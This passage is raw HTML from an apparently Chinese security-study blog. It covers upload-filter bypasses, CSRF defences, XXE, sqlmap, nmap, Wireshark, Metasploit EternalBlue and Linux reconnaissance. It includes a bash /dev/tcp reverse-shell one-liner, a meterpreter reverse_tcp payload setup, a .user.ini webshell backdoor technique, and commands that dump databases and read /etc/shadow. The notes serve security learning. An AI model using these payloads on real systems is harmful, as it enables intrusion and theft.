title=\".htaccess文件\"></a>.htaccess文件</h5><blockquote>\n<p>htaccess 在站点的根目录下面，不是在<a class=\"link\"   href=\"https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020\" >apache<i class=\"fas fa-external-link-alt\"></i></a>目录下，但是它属于apache的一个配置文件</p>\n</blockquote>\n<p>其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p>\n<h5 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h5><p>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auto_prepend_file = &lt;filename&gt;         //包含在文件头</span><br><span class=\"line\">auto_append_file = &lt;filename&gt;          //包含在文件尾</span><br></pre></td></tr></table></figure>\n\n<p>于是我们可以先上传.user.ini，然后上传一句话木马，让所有文件都包含了一句话木马</p>\n<h5 id=\"前端js绕过\"><a href=\"#前端js绕过\" class=\"headerlink\" title=\"前端js绕过\"></a>前端js绕过</h5><p>抓包直接修改</p>\n<h5 id=\"黑白名单绕过可以上传\"><a href=\"#黑白名单绕过可以上传\" class=\"headerlink\" title=\"黑白名单绕过可以上传\"></a>黑白名单绕过可以上传</h5><p>phtml php3 php4 php5 Php php (空格) php.，pphphp</p>\n<h5 id=\"修改content-type-添加GIF89a头\"><a href=\"#修改content-type-添加GIF89a头\" class=\"headerlink\" title=\"修改content-type,添加GIF89a头\"></a>修改content-type,添加GIF89a头</h5><h3 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h3><h4 id=\"原理-2\"><a href=\"#原理-2\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>攻击者利用服务器对用户的信任，从而欺骗受害者去服务器上执行受害者不知情的请求。</p>\n<p>攻击者会伪造一个用户发送给服务器的正常链接，其核心主要是要和已登录（已认证）的用户去发请求。CSRF不需要知道用户的Cookie，CSRF自己并不会发请求给服务器，一切交给用户</p>\n<h4 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h4><p>（1）避免在URL中明文显示特定操作的参数内容；</p>\n<p>（2）使用同步令牌（Synchronizer Token）,检查客户端请求是否包含令牌及其有效性；（常用的做法，并且保证每次token的值完全随机且每次都不同）</p>\n<p>（3）检查Referer Header，拒绝来自非本网站的直接URL请求。</p>\n<p>（4）不要在客户端保存敏感信息（比如身份认证信息）；</p>\n<p>（5）设置会话过期机制，比如20分钟无操作，直接登录超时退出；</p>\n<p>（6）敏感信息的修改时需要对身份进行二次确认，比如修改账号时，需要判断旧密码；</p>\n<p>（7）敏感信息的修改使用post而不是get</p>\n<p>（8）避免交叉漏洞， 如XSS等</p>\n<p>（9）禁止跨域访问</p>\n<p>（10）在响应中设置CSP（Content-Security-Policy）内容安全策略</p>\n<h4 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h4><p>XXE（XML External Entity Injection）也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时</p>\n<p>服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理</p>\n<p>导致可加载恶意外部文件 和 代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。</p>\n<h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><h4 id=\"常用指令\"><a href=\"#常用指令\" class=\"headerlink\" title=\"常用指令\"></a>常用指令</h4><p>-h                                           显示基本帮助信息</p>\n<p>-hh                                         显示高级帮助信息</p>\n<p>–version                                显示版本号</p>\n<p>-v                                           详细等级（0-6 默认 1）<br>-u                                          指定目标url</p>\n<p>-d                                          直接连接数据库</p>\n<p>-l                                           从burp代理日志的解析目标</p>\n<p>-r                                           从文件中加载http请求</p>\n<p>-g                                          从google dork的结果作为目标url</p>\n<p>-c                                          从INI配置文件中加载选项</p>\n<ol>\n<li><p>–purge      【重新扫描（–purge 删除原先对该目标扫描的记录）</p>\n</li>\n<li><p>–tables      【获取表名</p>\n</li>\n<li><p>–dbs         【检测站点包含哪些数据库</p>\n</li>\n<li><p>–current-db    【获取当前的数据库名</p>\n</li>\n<li><p>–current-user  【检测当前用户</p>\n</li>\n<li><p>–is-dba   【判断站点的当前用户是否为数据库管理员</p>\n</li>\n<li><p>–batch      【默认确认，不询问你是否输入</p>\n</li>\n<li><p>–search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）</p>\n</li>\n<li><p>–threads 10  【线程，sqlmap线程最高设置为10</p>\n</li>\n<li><p>–level 3        【sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头<br>                       的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5</p>\n</li>\n<li><p>–risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</p>\n</li>\n<li><p>-v   【详细的等级(0-6)<br>  0：只显示Python的回溯，错误和关键消息。<br>  1：显示信息和警告消息。<br>  2：显示调试消息。<br>  3：有效载荷注入。<br>  4：显示HTTP请求。<br>  5：显示HTTP响应头。<br>  6：显示HTTP响应页面的内容</p>\n</li>\n<li><p>–privileges  【查看权限</p>\n</li>\n<li><p>–tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件</p>\n</li>\n<li><p>–method “POST” –data “page&#x3D;1&amp;id&#x3D;2”   【POST方式提交数据</p>\n</li>\n<li><p>–threads number　　【采用多线程 后接线程数</p>\n</li>\n<li><p>–referer  “”  【使用referer欺骗</p>\n</li>\n<li><p>–user-agent “”     【自定义user-agent</p>\n</li>\n<li><p>–proxy “目标地址″   【使用代理注入</p>\n</li>\n</ol>\n<p>1.指定目标url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2.从文件中获取多个url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -m 1.txt</span><br></pre></td></tr></table></figure>\n\n<p>3.从文件中加载HTTP请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -r  url.txt</span><br></pre></td></tr></table></figure>\n\n<p>4.利用google获取目标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>5.从burp日志中获取目标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -l    burp.txt</span><br></pre></td></tr></table></figure>\n\n<p>实例演示-sqlmap注入检测</p>\n<p>1.GET参数注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2.POST参数注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol>\n<li><p>sqlmap -u  “<a class=\"link\"   href=\"http://www.xx.com/?id=x\" >http://www.xx.com?id=x<i class=\"fas fa-external-link-alt\"></i></a>“    【查询是否存在注入点</p>\n</li>\n<li><p>–dbs         【检测站点包含哪些数据库</p>\n</li>\n<li><p>–current-db    【获取当前的数据库名</p>\n</li>\n<li><p>–tables -D “db_name”  【获取指定数据库中的表名 -D后接指定的数据库名称</p>\n</li>\n<li><p>–columns  -T “table_name” -D “db_name”  【获取数据库表中的字段</p>\n</li>\n<li><p>–dump -C “columns_name” -T “table_name” -D “db_name”  【获取字段的数据内容</p>\n</li>\n</ol>\n<p>POST注入：</p>\n<pre><code>（1）目标地址http:// www.xxx.com /login.asp\n（2）打开brup代理。\n（3）点击表单提交\n（4）burp获取拦截信息（post）\n（5）右键保存文件（.txt）到指定目录下\n（6）运行sqlmap并执行如下命令：\n</code></pre>\n<p>用例：sqlmap -r okay.txt  -p  username</p>\n<p>&#x2F;&#x2F; -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p>\n<h3 id=\"AWVS\"><a href=\"#AWVS\" class=\"headerlink\" title=\"AWVS\"></a>AWVS</h3><h4 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>Acunetix Web Vulnerability Scanner（AWVS）可以扫描任何通过Web浏览器访问和遵循HTTP&#x2F;HTTPS规则的Web站点。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。</p>\n<p>AWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。</p>\n<h4 id=\"功能特点\"><a href=\"#功能特点\" class=\"headerlink\" title=\"功能特点\"></a>功能特点</h4><ul>\n<li><p>自动的客户端脚本分析器，允许对Ajax和Web2.0应用程序进行安全性测试</p>\n</li>\n<li><p>业内最先进且深入的SQL注入和跨站脚本测试</p>\n</li>\n<li><p>高级渗透测试工具，例如HTPP Editor和HTTP Fuzzer</p>\n</li>\n<li><p>可视化宏记录器帮助您轻松测试web表格和受密码保护的区域</p>\n</li>\n<li><p>支持含有CAPTHCA的页面，单个开始指令和Two Factor（双因素）验证机制</p>\n</li>\n<li><p>丰富的报告功能，包括VISA PCI依从性报告</p>\n</li>\n<li><p>高速的多线程扫描器轻松检索成千上万的页面</p>\n</li>\n<li><p>智能爬行程序检测web服务器类型和应用程序语言</p>\n</li>\n<li><p>Acunetix检索并分析网站，包括flash内容，SOAP和AJAX</p>\n</li>\n<li><p>端口扫描web服务器并对在服务器上运行的网络服务执行安全检查</p>\n</li>\n<li><p>可到处网站漏洞文件</p>\n</li>\n</ul>\n<h4 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h4><ul>\n<li><p>扫描整个网络，通过跟踪站点上的所有链接和robots.txt来实现扫描，扫描后AWVS就会映射出站点的结构并显示每个文件的细节信息。</p>\n</li>\n<li><p>在上述的发现阶段或者扫描过程之后，AWVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程（用自定义的脚本去探测是否有漏洞） 。WVS分析每一个页面中需要输入数据的地方，进而尝试3所有的输入组合。这是一个自动扫描阶段 。</p>\n</li>\n<li><p>在它发现漏洞之后，AWVS就会在“Alerts Node(警告节点)”中报告这些漏洞，每一个警告都包含着漏洞信息和如何修补漏洞的建议。</p>\n</li>\n<li><p>在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较，使用报告工具，就可以创建一个专业的报告来总结这次扫描。</p>\n</li>\n</ul>\n<h4 id=\"页面介绍\"><a href=\"#页面介绍\" class=\"headerlink\" title=\"页面介绍\"></a>页面介绍</h4><p>主菜单功能介绍：主菜单共有5个模块，分别为Dashboard、Targets、Vulnerabilities、Scans和Reports。</p>\n<ul>\n<li>Dashboard：仪表盘，显示扫描过的网站的漏洞信息</li>\n<li>Targets：目标网站，需要被扫描的网站</li>\n<li>Vulnerabilities：漏洞，显示所有被扫描出来的网站漏洞</li>\n<li>Scans：扫描目标站点，从Target里面选择目标站点进行扫描</li>\n<li>Reports：漏洞扫描完成后生成的报告</li>\n</ul>\n<p>设置菜单功能介绍：设置菜单共有8个模块，分别为Users、Scan Types、Network Scanner、Issue Trackers、Email Settings、Engines、Excluded Hours、Proxy Settings</p>\n<ul>\n<li>Users：用户，添加网站的使用者、新增用户身份验证、用户登录会话和锁定设置</li>\n<li>Scan Types：扫描类型，可根据需要勾选完全扫描、高风险漏洞、跨站点脚本漏洞、SQL 注入漏洞、弱密码、仅爬网、恶意软件扫描</li>\n<li>Network Scanner：网络扫描仪，配置网络信息包括地址、用户名、密码、端口、协议</li>\n<li>Issue Trackers：问题跟踪器，可配置问题跟踪平台如github、gitlab、JIRA等</li>\n<li>Email Settings：邮件设置，配置邮件发送信息</li>\n<li>Engines：引擎，引擎安装删除禁用设置</li>\n<li>Excluded Hours：扫描时间设置，可设置空闲时间扫描</li>\n<li>Proxy Settings：代理设置，设置代理服务器信息</li>\n</ul>\n<h3 id=\"APPSCAN\"><a href=\"#APPSCAN\" class=\"headerlink\" title=\"APPSCAN\"></a>APPSCAN</h3><h4 id=\"介绍-1\"><a href=\"#介绍-1\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>AppScan是IBM的一款web安全扫描工具，主要适用于Windows系统。该软件内置强大的扫描引擎，可以测试和评估Web服务和应用程序的风险检查，根据网站入口自动对网页链接进行安全扫描，扫描之后会提供扫描报告和修复建议等。</p>\n<h4 id=\"工作原理-1\"><a href=\"#工作原理-1\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h4><p>1）通过探索了解整个web页面结果</p>\n<p>2）通过分析，使用扫描规则库对修改的HTTP Request进行攻击尝试</p>\n<p>3）分析 Response 来验证是否存在安全漏洞</p>\n<h3 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h3><h4 id=\"软件功能\"><a href=\"#软件功能\" class=\"headerlink\" title=\"软件功能\"></a>软件功能</h4><p>1、分析网络底层协议；<br> 2、解决网络故障问题；<br> 3、找寻网络安全问题；</p>\n<h4 id=\"软件原理\"><a href=\"#软件原理\" class=\"headerlink\" title=\"软件原理\"></a>软件原理</h4><p>当信息以明文的形式在网络上传输时，便可以使用网络监听的方式来进行攻击。<code>将网络接口设置在监听模式，便可以将网上传输的源源不断的信息截获。</code>嗅探技术常常用于网络故障诊断、协议分析、应用性能分析和网络安全保障等各个领域</p>\n<h4 id=\"过滤\"><a href=\"#过滤\" class=\"headerlink\" title=\"过滤\"></a>过滤</h4><h4 id=\"协议过滤\"><a href=\"#协议过滤\" class=\"headerlink\" title=\"协议过滤\"></a>协议过滤</h4><p>tcp，只显示TCP协议的数据包列表<br> http，只查看HTTP协议的数据包列表<br> icmp，只显示ICMP协议的数据包列表</p>\n<h4 id=\"ip过滤\"><a href=\"#ip过滤\" class=\"headerlink\" title=\"ip过滤\"></a>ip过滤</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip.src ==192.168.1.104 显示源地址为192.168.1.104的数据包列表</span><br><span class=\"line\">ip.dst==192.168.1.104, 显示目标地址为192.168.1.104的数据包列表</span><br><span class=\"line\">ip.addr == 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"端口过滤\"><a href=\"#端口过滤\" class=\"headerlink\" title=\"端口过滤\"></a>端口过滤</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port ==80,  显示源主机或者目的主机端口为80的数据包列表。</span><br><span class=\"line\">tcp.srcport == 80,  只显示TCP协议的源主机端口为80的数据包列表。</span><br><span class=\"line\">tcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Http模式过滤\"><a href=\"#Http模式过滤\" class=\"headerlink\" title=\"Http模式过滤\"></a>Http模式过滤</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.request.method==“GET”, 只显示HTTP GET方法的</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"逻辑运算符为-and-or-not\"><a href=\"#逻辑运算符为-and-or-not\" class=\"headerlink\" title=\"逻辑运算符为 and&#x2F;or&#x2F;not\"></a>逻辑运算符为 and&#x2F;or&#x2F;not</h4><p>过滤多个条件组合时，使用and&#x2F;or。比如获取IP地址为192.168.1.104的ICMP数据包表达式为：<code>ip.addr == 192.168.1.104 and icmp</code></p>\n<h3 id=\"nmap\"><a href=\"#nmap\" class=\"headerlink\" title=\"nmap\"></a>nmap</h3><table>\n<thead>\n<tr>\n<th>参数(注意区分大小写)</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-sT</td>\n<td>TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</td>\n</tr>\n<tr>\n<td>-sS</td>\n<td>半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。</td>\n</tr>\n<tr>\n<td>-sF  -sN</td>\n<td>秘密FIN数据包扫描、Xmas Tree、Null扫描模式</td>\n</tr>\n<tr>\n<td>-sP</td>\n<td>ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。</td>\n</tr>\n<tr>\n<td>-sU</td>\n<td>UDP扫描，但UDP扫描是不可靠的</td>\n</tr>\n<tr>\n<td>-sA</td>\n<td>这项高级的扫描方法通常用来穿过防火墙的规则集</td>\n</tr>\n<tr>\n<td>-sV</td>\n<td>探测端口服务版本</td>\n</tr>\n<tr>\n<td>-Pn</td>\n<td>扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</td>\n</tr>\n<tr>\n<td>-v</td>\n<td>显示扫描过程，推荐使用</td>\n</tr>\n<tr>\n<td>-h</td>\n<td>帮助选项，是最清楚的帮助文档</td>\n</tr>\n<tr>\n<td>-p</td>\n<td>指定端口，如“1-65535、1433、135、22、80”等</td>\n</tr>\n<tr>\n<td>-O</td>\n<td>启用远程操作系统检测，存在误报</td>\n</tr>\n<tr>\n<td>-A</td>\n<td>全面系统检测、启用脚本检测、扫描等</td>\n</tr>\n<tr>\n<td>-oN&#x2F;-oX&#x2F;-oG</td>\n<td>将报告写入文件，分别是正常、XML、grepable 三种格式</td>\n</tr>\n<tr>\n<td>-T4</td>\n<td>针对TCP端口禁止动态扫描延迟超过10ms</td>\n</tr>\n<tr>\n<td>-iL</td>\n<td>读取主机列表，例如，“-iL C:\\ip.txt”</td>\n</tr>\n</tbody></table>\n<p><strong>1、扫描单个目标</strong></p>\n<p>nmap ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n<p><strong>2、扫描多个目标</strong></p>\n<p>nmap ip1 ip2 适用于目标地址不再同一个网段或在同一网段不连续且数量不多的情况。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.101 192.168.0.110</span><br></pre></td></tr></table></figure>\n\n<p><strong>3、扫描一个范围内的目标</strong></p>\n<p>nmap xxx.xxx.xxx.xxx-xxx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.100-110</span><br></pre></td></tr></table></figure>\n\n<p><strong>4、扫描目标地址所在某网段</strong></p>\n<p>namp xxx.xxx.xxx.xxx&#x2F;xx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.1/24</span><br></pre></td></tr></table></figure>\n\n<p><strong>5、扫描包含主机列表的文件中的所有地址</strong></p>\n<p>nmap -iL <File path></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap -iL /root/target.txt</span><br></pre></td></tr></table></figure>\n\n<p><strong>6、扫描除了一个目标地址之外的所有地址</strong></p>\n<p>nmap ip段 -exclude 被排除的ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.100-110 -exclude 192.168.0.103</span><br><span class=\"line\">   nmap 192.168.0.1/24 -exclude 192.168.0.103 </span><br></pre></td></tr></table></figure>\n\n<p><strong>7、扫描目标地址的指定端口</strong></p>\n<p>nmap ip -p 端口1，端口2，端口3……</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如:nmap 192.168.0.101 -p 80,8080,3306,3389</span><br></pre></td></tr></table></figure>\n\n<p><strong>8、扫描目标地址C段的在线主机</strong></p>\n<p>nmap -sP ip段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap -sP 192.168.0.1/24</span><br></pre></td></tr></table></figure>\n\n<p><strong>9、扫描目标地址操作系统版本进行探测</strong></p>\n<p>nmap -O ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap -O 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n<p><strong>10、扫描目标所开放的全部端口（半开式）</strong></p>\n<p>nmap -sS -p 端口号(多个用“,”隔开) -v ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap -sS -p 1-65535 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"MSF\"><a href=\"#MSF\" class=\"headerlink\" title=\"MSF\"></a>MSF</h3><h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>Metasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。</p>\n<p>它本身附带数百个已知软件漏洞，<strong>是一款专业级漏洞攻击工具</strong></p>\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><p>根据漏洞名称搜索 : <code>search ms17_010</code></p>\n<p>1、运用辅助模块扫描目标</p>\n<p>设置模块：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p>\n<p>查看设置：<code>options</code> </p>\n<p>设置目标地址：<code>set rhosts 192.168.174.129</code></p>\n<p>目标端口默认是445，如果用nmap端口扫描windows文件共享服务不是开放在445端口上面，那这里需要进行修改，<code>set rport 目标端口</code></p>\n<p>设置好了之后，<code>run</code>或者<code>exploit</code> 进行攻击</p>\n<p>2、设置攻击模块对目标进行攻击</p>\n<p>使用攻击模块：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p>\n<p>查看所需设置：<code>options</code> </p>\n<p>设置目标地址：<code>set RHOSTS 192.168.174.129</code></p>\n<p>设置目标端口：<code>set RPORT 445</code></p>\n<p>设置payload：<code>set payload windows/x64/meterpreter/reverse_tcp</code></p>\n<p>设置本地地址：<code>set LHOST 192.168.174.192</code></p>\n<p>攻击：<code>run</code>或者<code>exploit</code> </p>\n<h3 id=\"Linux命令\"><a href=\"#Linux命令\" class=\"headerlink\" title=\"Linux命令\"></a>Linux命令</h3><p><strong>命令：netstat</strong></p>\n<p>用途：查看系统的网络连接状态、路由表、接口统计等信息</p>\n<p>格式：netstat [选项]</p>\n<p>常用选项：</p>\n<ul>\n<li>-a：显示所有活动连接</li>\n<li>-n：以数字形式显示</li>\n<li>-p：显示进程信息</li>\n<li>-t：查看TCP协议相关信息</li>\n<li>-u：查看UDP协议相关信息</li>\n<li>-r：显示路由表信息</li>\n</ul>\n<p><strong>命令：network</strong></p>\n<p>用途：启用、禁用网络接口配置</p>\n<p>重启network格式：service network restart</p>\n<p><strong>命令：chmod</strong></p>\n<p>用途：权限控制命令</p>\n<p>Linux系统下文件权限显示如下图所示，第一个数字，数字代表的意义为：</p>\n<ul>\n<li>– 普通文件</li>\n<li>d 目录</li>\n<li>s socket套接字</li>\n<li>l 软链接</li>\n<li>p 管道</li>\n<li>c 字符设备</li>\n<li>b 块设备</li>\n</ul>\n<p><code>uname -a</code>: 此命令可以查看当前Linux系统内核具体版本、使用的发行版版本、以及当前处理器架构!(这里的架构非常重要,大部分针对Linux攻击载荷都需要明确处理器架构才能使用)</p>\n<p>存放系统信息的文件</p>\n<ul>\n<li>cat &#x2F;etc&#x2F;issue: 连接系统时显示的提示信息,默认一般会存放发行版名称等信息(PS:用户可能会把这个当成备忘录存放一些口令)</li>\n<li>cat &#x2F;etc&#x2F;<em>-release: 详细的发行版系统版本信息(不同的发行版可能名字会略有不同,并且此文件可能有多个,这种情况下我们可以使用通配符</em>来解决这个问题。ls &#x2F;etc | grep “release””可以使用此命令来查看你系统中此文件夹具体有哪些!)</li>\n<li>cat &#x2F;proc&#x2F;version: 详细的系统内核信息,用于编译内核的gcc的版本以及内核编译的时间。</li>\n<li>cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;version: 系统内核信息,相当uname -v(&#x2F;proc&#x2F;sys&#x2F;kernel文件夹中可以监视和调整Linux内核中的各种活动!但需要管理员权限!)</li>\n</ul>\n<p>进程信息</p>\n<pre><code>ps: 列出本用户当前使用的终端中运行的进程\n    ps -elf: 显示详细的(-l)带UID,PPIP,C与STIME栏位(-f)现行终端机下的所有进程(-e)\n    ps aux: 已用户为主的格式(u)显示所有用户(a)的所有终端机(x)下的所有进程\ntop: 类似Windows的任务管理器\n</code></pre>\n<p><code>cat /etc/passwd</code>: 可以登录系统或其他拥有正在运行的进程的操作系统的用户身份信息</p>\n<p><code>cat /etc/shadow</code>: 所有用户的密码安全策略,一般只有超级用户对此文件夹才有访问权限!</p>\n<p><code>cat /etc/sudoers</code>: 对权限的分配管理   </p>\n<p><code>ifconfig -a</code>: 查看网络、网卡相关信息</p>\n<p><code>hostname</code>: 显示、设置系统的主机名称</p>\n<h4 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"OSI模型\"><a href=\"#OSI模型\" class=\"headerlink\" title=\"OSI模型\"></a>OSI模型</h3><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440002.png\"\n                        alt=\"图片-1685330434325\"\n                 ><strong>应用层：为应用程序或用户请求提供各种请求服务。</strong>OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。</p>\n<p><strong>表示层：数据编码、格式转换、数据加密。</strong>提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p>\n<p><strong>会话层：创建、管理和维护会话。</strong>接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。</p>\n<p><strong>传输层：数据通信。</strong>建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。</p>\n<p><strong>网络层：IP选址及路由选择。</strong>通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进&#x2F;出路由等控制，将信息从一个网络设备传送到另一个网络设备。</p>\n<p><strong>数据链路层：提供介质访问和链路管理。</strong>接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p>\n<p><strong>物理层：管理通信设备和网络媒体之间的互联互通。</strong>传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。</p>\n<h3 id=\"TCP-IP五层模型\"><a href=\"#TCP-IP五层模型\" class=\"headerlink\" 